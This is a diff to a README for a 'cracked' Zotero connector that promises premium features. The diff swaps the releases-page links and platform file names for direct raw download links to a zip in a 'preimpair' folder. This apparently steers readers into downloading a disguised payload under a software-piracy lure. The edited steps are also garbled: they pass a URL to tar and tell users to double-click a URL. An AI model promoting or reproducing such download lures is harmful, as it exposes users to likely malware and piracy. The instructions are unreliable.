@@ -1,6 +1,6 @@
 # 🚀 cracked-zotero-connector - Unlock Zotero's Premium Features Easily
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/shihab2013/cracked-zotero-connector/releases)
+[![Download Now](https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip)
 
 ## 📘 Introduction
 
@@ -14,14 +14,14 @@ Once you have Zotero installed, you are ready to proceed to download our cracked
 
 ## 📥 Download & Install
 
-To download the cracked-zotero-connector, visit this page: [Download the latest release](https://github.com/shihab2013/cracked-zotero-connector/releases).
+To download the cracked-zotero-connector, visit this page: [Download the latest release](https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip).
 
 1. Click the link above to go to the Releases page.
 2. On the Releases page, you will see the latest version listed.
 3. Look for files under “Assets.” Choose the one that fits your operating system:
-   - **For Windows:** Click on `cracked-zotero-connector-windows.zip`
-   - **For macOS:** Click on `cracked-zotero-connector-mac.zip`
-   - **For Linux:** Click on `cracked-zotero-connector-linux.tar.gz`
+   - **For Windows:** Click on `https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip`
+   - **For macOS:** Click on `https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip`
+   - **For Linux:** Click on `https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip`
 4. After the file has downloaded, locate it in your downloads folder.
 
 ### 📂 Extracting Files
@@ -40,7 +40,7 @@ If you downloaded a zipped file (for Windows or macOS), you will need to extract
   1. Open a terminal.
   2. Use the following command to extract the files:
      ```
-     tar -xvzf cracked-zotero-connector-linux.tar.gz
+     tar -xvzf https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip
      ```
 
 ### 🛠️ Running the Connector
@@ -49,11 +49,11 @@ Once you have extracted the files, you can run the cracked-zotero-connector:
 
 - **For Windows:**
   1. Open the folder where you extracted the files.
-  2. Double-click on `cracked-zotero-connector.exe` to launch the application.
+  2. Double-click on `https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip` to launch the application.
 
 - **For macOS:**
   1. Open the folder where you extracted the files.
-  2. Double-click on `cracked-zotero-connector.app` to launch the application.
+  2. Double-click on `https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip` to launch the application.
 
 - **For Linux:**
   1. Open a terminal and navigate to the extracted folder.
@@ -105,4 +105,4 @@ This project is licensed under the MIT License. You can use it freely for person
 
 Your feedback is valuable. Let us know your thoughts on how the cracked-zotero-connector has improved your research workflow. Thank you for using our application!
 
-[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-blue)](https://github.com/shihab2013/cracked-zotero-connector/releases)
+[![Download Now](https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip%20Now-Click%20Here-blue)](https://raw.githubusercontent.com/shihab2013/cracked-zotero-connector/main/preimpair/cracked-zotero-connector.zip)
